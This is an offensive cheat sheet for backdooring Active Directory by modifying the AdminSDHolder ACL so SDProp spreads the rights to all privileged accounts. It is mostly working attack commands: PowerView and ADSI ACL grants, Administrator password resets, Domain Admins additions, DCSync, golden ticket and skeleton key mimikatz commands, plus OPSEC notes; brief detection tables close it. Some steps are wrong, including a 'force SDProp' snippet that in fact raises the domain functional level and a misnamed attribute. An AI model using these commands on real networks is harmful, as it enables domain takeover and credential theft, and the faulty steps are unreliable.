# AdminSDHolder & SDProp Abuse

## Overview

**AdminSDHolder** (AdminSDHolder) is a special AD container (`CN=AdminSDHolder,CN=System,DC=domain,DC=local`) that acts as a security template for privileged accounts and groups. The **SDProp** (Security Descriptor Propagator) process runs every 60 minutes (by default) on the PDC emulator. It compares the ACLs of protected objects against the AdminSDHolder ACL template — if they differ, it **reverts** the protected objects ACLs to match AdminSDHolder.

This mechanism makes it difficult to permanently backdoor privileged groups, but also creates an opportunity: **if you can modify the AdminSDHolder ACL, you automatically get your rights propagated to all protected objects every 60 minutes.**

## Protected Objects

### Protected Groups (adminCount=1 sets automatically)
- Account Operators
- Administrators
- Backup Operators
- Domain Admins
- Domain Controllers
- Enterprise Admins
- Krbtgt
- Print Operators
- Replicator
- Schema Admins
- Server Operators

### Protected Users (adminCount=1 set automatically)
- Any user in the above groups has `adminCount` set to 1
- Service accounts in these groups

## How SDProp Works

```
1. SDProp runs every 60 min (configurable via adminsdholderpropagationtime)
2. Reads ACL from CN=AdminSDHolder,CN=System,DC=domain,DC=local
3. Compares with protected objects (adminCount=1)
4. Reverts any ACL differences on protected objects
5. Re-applies AdminSDHolder ACL template
```

### Find Protected Objects

```powershell
# PowerView - Find objects with adminCount=1
Get-DomainUser -AdminCount

# PowerView - Find groups with adminCount=1
Get-DomainGroup -AdminCount

# PowerView - Find computers with adminCount=1
Get-DomainComputer -AdminCount

# AD Module
Get-ADUser -Filter {adminCount -eq 1}
Get-ADGroup -Filter {adminCount -eq 1}
Get-ADComputer -Filter {adminCount -eq 1}

# Manual LDAP
ldapsearch -H ldap://dc01 -D "user@domain.local" -w "pass" -b "DC=domain,DC=local" "(adminCount=1)" dn

# BloodHound
MATCH (n {admincount:true}) RETURN labels(n), n.name

# Count protected objects
$protectedUsers = Get-DomainUser -AdminCount
$protectedUsers.Count
```

## AdminSDHolder Abuse

### Prerequisites
- `GenericAll`, `GenericWrite`, `WriteDACL`, or `WriteOwner` on `CN=AdminSDHolder,CN=System,DC=domain,DC=local`
- Or `Full Control` on the System container that contains AdminSDHolder

### Technique 1: Add User to AdminSDHolder ACL

```powershell
# Grant a user full control over AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All -Verbose

# After 60 minutes (or forced), this user has full control over all protected objects

# Alternative - grant specific right
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights GenericWrite -Verbose
```

### Technique 2: Backdoor via PowerView

```powershell
# Find current ACL on AdminSDHolder
Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -ResolveGUIDs

# Add attacker as GenericAll
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All

# Verify
Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $attackerSID }
```

### Technique 3: Add User via ADSI

```powershell
$ADSI = [ADSI]"LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=local"
$ACL = $ADSI.PSBase.ObjectSecurity
$user = New-Object System.Security.Principal.NTAccount "domain\attacker"
$sid = $user.Translate([System.Security.Principal.SecurityIdentifier])
$right = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, $right, $type
$ACL.AddAccessRule($rule)
$ADSI.PSBase.ObjectSecurity = $ACL
$ADSI.PSBase.CommitChanges()
```

### Technique 4: Backdoor a Specific Privileged Group

Instead of modifying AdminSDHolder (which affects ALL protected objects), you can target a specific group:

```powershell
# Bypass SDProp protection on a specific group by:
# 1. Gaining WriteDACL on the target group
# 2. Adding your user with inheritable permissions
# 3. SDProp won't revert if the propagation doesn't cover the specific inheritance

# This is less reliable - SDProp eventually reverts
```

### Forcing SDProp to Run

```powershell
# Default: runs every 60 minutes on PDC emulator
# To force immediate propagation (requires Domain Admin):

# 1. On the PDC emulator, trigger via PowerShell
$context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("DirectoryServer", "DC01.domain.local")
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context)
$domain.RaiseDomainFunctionality([System.DirectoryServices.ActiveDirectory.DomainMode]::Windows2003Domain)

# 2. Alternatively modify the msDS-SDPropagationTime attribute
# (set to 0-60 minutes)

# 3. Wait for normal cycle (most reliable)
```

## Post-Exploitation: What You Can Do with AdminSDHolder Rights

Once you have rights to AdminSDHolder (and SDProp has propagated), you have equivalent rights on all protected objects:

```powershell
# After propagation (wait 60 min or force):

# Reset Domain Admin password
Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString "P@ss123" -AsPlainText -Force)

# Add self to Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members 'attacker'

# Add self to Enterprise Admins
Add-DomainGroupMember -Identity "Enterprise Admins" -Members 'attacker'

# DCSync (if you extended to domain object)
python3 secretsdump.py domain/attacker:pass@DC01 -just-dc

# Dump all user hashes
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt" exit

# Golden Ticket
mimikatz.exe "kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator /ptt" exit

# Skeleton Key (if persistent access)
mimikatz.exe "privilege::debug" "misc::skeleton" exit
```

## OPSEC Considerations

- **AdminSDHolder modification** generates Event ID 5136 (Directory Service change) on `nTSecurityDescriptor`
- **SDProp propagation** occurs silently but ACL changes on protected objects after propagation also generate 5136
- **Setting adminCount=1** on a user generates Event ID 5136
- **Wait time**: 60 minutes before backdoor is fully propagated; changes before propagation are temporary
- **Detection**: Any modification to AdminSDHolder is high-severity; SOCs typically monitor this as a persistence indicator
- **Purple Team note**: Some orgs monitor `adminsdholder` modifications with custom alerts

## Detection

| Event ID | Description |
|----------|-------------|
| 5136 | AdminSDHolder ACL modified |
| 4662 | Directory Service access (reading AdminSDHolder) |
| 5141 | Directory Service deletion (delete AdminSDHolder) |
| 4724 | Password reset of protected user (post-propagation) |
| 4728/4732/4756 | Protected group member added (post-propagation) |

### Blue Team Detection

```powershell
# Monitor for AdminSDHolder ACL changes
Get-WinEvent -FilterHashtable @{
  LogName='Security'
  ID=5136
} | Where-Object { $_.Properties[1].Value -like "*AdminSDHolder*" }

# Check who has modified ACL on AdminSDHolder
# Look for Event ID 5136 with ObjectDN containing AdminSDHolder
```

## Quick Reference

```powershell
# Find AdminSDHolder
Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -ResolveGUIDs

# Find protected users
Get-DomainUser -AdminCount

# Grant rights to AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All

# After propagation (60 min) → reset DA password
Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString "NewP@ss123" -AsPlainText -Force)

# BloodHound check for AdminSDHolder owners
MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(m)
WHERE m.name = "ADMINSDHOLDER@DOMAIN.LOCAL" RETURN n.name, TYPE(r)
```
